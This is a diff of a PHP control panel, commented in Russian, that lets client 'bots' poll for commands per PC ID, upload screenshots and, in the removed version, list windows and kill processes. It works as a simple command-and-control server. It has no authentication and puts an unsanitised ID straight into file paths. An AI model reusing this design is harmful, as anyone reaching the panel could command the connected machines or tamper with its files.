@@ -1,57 +1,37 @@
 <?php
-// Файл для хранения команды
 $dataFile = 'data.txt';
+$cmdFile = 'cmd.txt'; // Храним команду отдельно для каждого ID
+$imgFile = 'screenshot.jpg';
 
-// Если файла нет, создаем его и даем права на запись
-if (!file_exists($dataFile)) {
-    file_put_contents($dataFile, 'none');
-    chmod($dataFile, 0666);
-}
-
-// 1. Бот спрашивает: "Есть команды?"
 if (isset($_GET['get_cmd'])) {
-    echo trim(file_get_contents($dataFile));
+    $pc_id = $_GET['pc_id'] ?? 'default';
+    echo file_exists("cmd_$pc_id.txt") ? file_get_contents("cmd_$pc_id.txt") : 'none';
     exit;
 }
 
-// 2. Бот говорит: "Команду выполнил, сотри её"
-if (isset($_GET['clear_cmd'])) {
-    file_put_contents($dataFile, 'none');
-    echo "ok";
-    exit;
+if (isset($_FILES['screen'])) {
+    move_uploaded_file($_FILES['screen']['tmp_name'], $imgFile);
+    echo "ok"; exit;
 }
 
-// 3. Обработка команд с сайта
+// Установка команды для конкретного ПК
 if (isset($_POST['set_cmd'])) {
-    $cmd = $_POST['set_cmd'];
-    // Если команда delete, добавляем имя процесса
-    if ($cmd == 'delete' && !empty($_POST['proc_name'])) {
-        $cmd .= ' ' . trim($_POST['proc_name']);
-    }
-    file_put_contents($dataFile, $cmd);
-    header("Location: /");
-    exit;
+    $pc_id = $_POST['pc_id'];
+    file_put_contents("cmd_$pc_id.txt", $_POST['set_cmd']);
+    header("Location: /"); exit;
 }
 ?>
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>Панель управления</title>
-    <style>
-        body { background: #1a1a24; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
-        button { background: #4f46e5; color: white; border: none; padding: 15px; margin: 5px; border-radius: 8px; cursor: pointer; }
-    </style>
-</head>
-<body>
+<html>
+<body style="background:#1a1a24; color:white; text-align:center;">
     <h1>Управление ПК</h1>
-    <p>Текущая команда: <b><?php echo htmlspecialchars(trim(file_get_contents($dataFile))); ?></b></p>
-    
     <form method="POST">
-        <button name="set_cmd" value="screen">Сделать скриншот</button>
-        <button name="set_cmd" value="app">Список окон</button>
-        <input type="text" name="proc_name" placeholder="Процесс для kill">
-        <button name="set_cmd" value="delete">Убить процесс</button>
+        <input type="text" name="pc_id" placeholder="ID твоего ПК (напр. PC-01)" required>
+        <button name="set_cmd" value="screen">Скриншот</button>
     </form>
+    <?php if(file_exists($imgFile)): ?>
+        <h3>Последний скриншот:</h3>
+        <img src="screenshot.jpg?<?php echo time(); ?>" style="max-width:500px; border:2px solid #fff;">
+    <?php endif; ?>
 </body>
 </html>
